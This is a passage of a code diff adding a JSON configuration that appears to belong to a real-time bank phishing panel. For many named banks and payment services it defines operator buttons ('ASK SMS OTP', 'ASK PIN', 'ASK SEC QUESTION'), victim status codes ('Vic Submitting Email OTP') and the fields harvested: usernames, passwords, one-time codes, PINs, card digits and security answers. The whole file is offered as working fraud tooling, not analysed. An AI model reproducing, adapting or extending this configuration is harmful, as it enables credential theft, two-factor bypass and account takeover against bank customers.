+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "micb": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "nab": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "oberbank": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "people": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "rural": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "sants": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "suncorp": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "george": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "lloyds": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "heritage": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "ubank": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK LAST 4",
+        "status": "2"
+      },
+      {
+        "name": "ASK PIN",
+        "status": "4"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "6"
+      },
+      {
+        "name": "ASK PAYMENT OTP",
+        "status": "14"
+      },
+      {
+        "name": "ASK POT OTP",
+        "status": "15"
+      },
+      {
+        "name": "ASK SEC QUESTION",
+        "status": "10",
+        "input": {
+          "id": "secQuestion",
+          "placeholder": "Security Question"
+        }
+      },
+      {
+        "name": "ASK PASSWORD",
+        "status": "12"
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting Last 4"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted Last 4"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting PIN"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted PIN"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Submitting Sec Answer"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Submitted Sec Answer"
+      },
+      {
+        "status": 12,
+        "meaning": "Vic Submitting Password"
+      },
+      {
+        "status": 13,
+        "meaning": "Vic Waiting... Submitted Password"
+      },
+      {
+        "status": 14,
+        "meaning": "Vic Submitting Payment OTP"
+      },
+      {
+        "status": 15,
+        "meaning": "Vic Submitting Pot OTP"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "Last 4",
+        "key": "last4"
+      },
+      {
+        "heading": "PIN",
+        "key": "pin"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Sec Question",
+        "key": "secQuestion"
+      },
+      {
+        "heading": "Sec Answer",
+        "key": "secAnswer"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "telephone"
+      }
+    ]
+  },
+  "wise": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK APP APPROVE",
+        "status": "2"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting App Approve"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Approved In App"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Didnt Approve"
+      },
+      {
+        "status": 8,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Email",
+        "key": "email"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "email"
+      }
+    ]
+  },
+  "ubankIVR": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "ubankOne": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK SEC QUESTION",
+        "status": "2",
+        "input": {
+          "id": "secQuestion",
+          "placeholder": "Security Question"
+        }
+      },
+      {
+        "name": "ASK OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting Sec Answer"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted Sec Answer"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Email",
+        "key": "email"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Security Question",
+        "key": "secQuestion"
+      },
+      {
+        "heading": "Security Answer",
+        "key": "secAnswer"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "telephone"
+      }
+    ]
+  },
+  "kc": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "kiwi": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "9"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK NETCODE",
+        "status": "4"
+      },
+      {
+        "name": "ASK TELEPHONE",
+        "status": "6"
+      },
+      {
+        "name": "ASK SECURITY QUESTION",
+        "status": "10",
+        "input": {
+          "id": "securityQuestion",
+          "placeholder": "Security Question"
+        }
+      },
+      {
+        "name": "FINISH",
+        "status": "8"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Netcode"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Netcode"
+      },
+      {
+        "status": 6,
+        "meaning": "Vic Submitting Telephone"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Waiting... Submitted Telephone"
+      },
+      {
+        "status": 8,
+        "meaning": "Finished"
+      },
+      {
+        "status": 9,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 10,
+        "meaning": "Vic Submitting Security Answer"
+      },
+      {
+        "status": 11,
+        "meaning": "Vic Waiting... Submitted Security Answer"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "Telephone",
+        "key": "telephone"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      },
+      {
+        "heading": "Netcode",
+        "key": "netcode"
+      },
+      {
+        "heading": "Security Question",
+        "key": "securityQuestion"
+      },
+      {
+        "heading": "Security Answer",
+        "key": "securityAnswer"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "vanquis": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "wp": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "wells": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  },
+  "teachers": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "7"
+      },
+      {
+        "name": "ASK SMS OTP",
+        "status": "2"
+      },
+      {
+        "name": "ASK EMAIL OTP",
+        "status": "4"
+      },
+      {
+        "name": "FINISH",
+        "status": "6"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitted Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting SMS OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted SMS OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Vic Submitting Email OTP"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Submitted Email OTP"
+      },
+      {
+        "status": 6,
+        "meaning": "Finished"
+      },
+      {
+        "status": 7,
+        "meaning": "Vic Resubmitting Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "Username",
+        "key": "username"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "SMS OTP",
+        "key": "smsCode"
+      },
+      {
+        "heading": "Email OTP",
+        "key": "emailCode"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "username"
+      }
+    ]
+  }
+}
